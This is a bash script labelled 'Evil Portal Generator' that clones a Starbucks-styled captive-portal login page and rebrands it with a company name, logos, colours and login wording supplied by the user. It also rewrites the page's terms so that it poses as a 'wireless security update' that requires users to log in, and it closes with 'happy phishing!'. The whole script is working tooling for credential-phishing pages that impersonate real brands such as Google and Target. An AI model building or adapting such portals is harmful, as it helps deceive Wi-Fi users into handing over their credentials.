#!/bin/bash

printf "⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
⠀⣀⣠⣿⣷⣴⣶⣶⣶⣶⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣧⣀⣀⠀
⢰⣿⡿⠛⠛⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠛⠛⢿⣿⡆
⣸⣿⠁⠀⣀⡀⠀⢀⡀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠈⣿⣇
⢿⣿⠀⠀⠻⠏⠀⠻⠟⠀⠻⠟⠀⠀⠀⠀⠀⠀⠻⠟⠀⠀⣿⡟
⢸⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡇
⠈⠻⠿⣿⣿⣶⣶⣶⣶⣦⣤⣤⣤⣤⣴⣶⣶⣶⣶⣿⣿⠿⠟⠁
⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀"
echo -e "[ Evil Portal Generator ]\n"
echo
echo -e "[Prerequisites: Background image (2558x1452), Large Icon image (2000x2000), Small Icon Image (30x30)]"
echo -e "[Enter to Continue]\n"
echo -e "[*] Title of Evil Portal [facebook-login]: "
read -p "evilportal(folder)> " folder

cp -R ~/portals/starbucks-login ~/portals/$folder
sed -i "s/starbucks-login/$folder/" ~/portals/$folder/starbucks-login.ep && mv ~/portals/$folder/starbucks-login.ep ~/portals/$folder/$folder.ep && rm ~/portals/$folder/assets/img/*.png

echo -e "[*] Enter Page Title [Sign in - Starbucks]: "
read -p "evilportal(pageTitle)> " pagetitle
echo -e "[*] Enter Login Form Title [Update, Sign in, Free Wifi, etc]: "
read -p "evilportal(loginTitle)> " logintitle
echo -e "[*] Enter Company Name [ie. Starbucks, Target, Google, etc]"
read -p "evilportal(company)> " company
echo -e "[*] Enter Login Type [Email, Wifi Name, etc]: "
read -p "evilportal(loginType)> " logintype
echo

echo -e "[Background, ICON File Names]\n"
echo -e "[*] Enter Path to Background picture [2558x1452]: "
read -p "evilportal(background)> " background
echo -e "[*] Enter Path to Large Icon [2000x2000]: "
read -p "evilportal(largeIcon)> " largeicon
echo -e "[*] Enter Path to Small Icon [30x30]: "
read -p "evilportal(smallIcon)> " smallicon
echo -e "[*] Hexidecimal color code [FF00FF]: "
read -p "evilportal(color)> " hexcolor
echo
clear

echo -e "[!] Replacing Strings in Index File..\n"
sed -i "s/Sign in - Starbucks/$pagetitle/" ~/portals/$folder/index.php
sed -i "s/Free Wi-Fi/$logintitle/" ~/portals/$folder/index.php
#sed -i "s/From our friends at Google/From our friends at $company/" ~/portals/$folder/index.php
sed -i "s/Google/$company/" ~/portals/$folder/index.php
sed -i "s/GOOGLE/$company/" ~/portals/$folder/index.php
sed -i "s/5atoko1sqg.png/$background/" ~/portals/$folder/index.php
sed -i "s/pa6dyy5wcc.png/$largeicon/" ~/portals/$folder/index.php
sed -i "s/s5g1cxz9vr.png/$smallicon/" ~/portals/$folder/index.php
sed -i "s/Email/$logintype/" ~/portals/$folder/index.php
sed -i "s/This is a free wireless hotspot internet service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user./This is a wireless security update service (the “Service”) provided for use by customers. The user is required to log-in as an agreement of use and verification to update./" ~/portals/$folder/index.php

echo -e "[!] Changing colors in style.css file.."
sed -i "s/007140/$hexcolor/" ~/portals/$folder/assets/css/style.css && sed -i "s/5da522/$hexcolor/" ~/portals/$folder/assets/css/style.css && sed -i "s/6fb62f/$hexcolor/" ~/portals/$folder/assets/css/style.css
sed -i "s/65AB28/$hexcolor/" ~/portals/$folder/assets/css/style.css && sed -i "s/318a00/$hexcolor/" ~/portals/$folder/assets/css/style.css
echo

echo -e "[*] Moving assets to assets folder..\n"
mv $background ~/portals/$folder/assets/img/ && mv $smallicon ~/portals/$folder/assets/img/ && mv $largeicon ~/portals/$folder/assets/img/
printf "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢉⣡⣤⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀⢸⣇⠀⠀
⠀⠙⣿⣷⣦⡀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⠋⠉⣿⠟⠁⠀⠀⢸⡟⠀⠀
⠀⠀⢸⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⠁⠀⠀⣷⡄⢸⡇⠀⠀
⠀⠀⠀⣿⠁⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⢿⣀⣸⡇⠀⠀
⠀⠀⠀⣿⣷⣤⣈⠛⠻⢿⣿⡿⢁⣼⣿⣿⡿⠛⣿⣿⣿⣦⣄⡀⠈⠉⠉⠁⠀⠀
⠀⠀⢀⣿⡿⠟⠁⠀⠀⠀⠀⠀⠛⠉⠉⠠⠤⠾⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀
⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo

echo "Done.. happy phishing!"
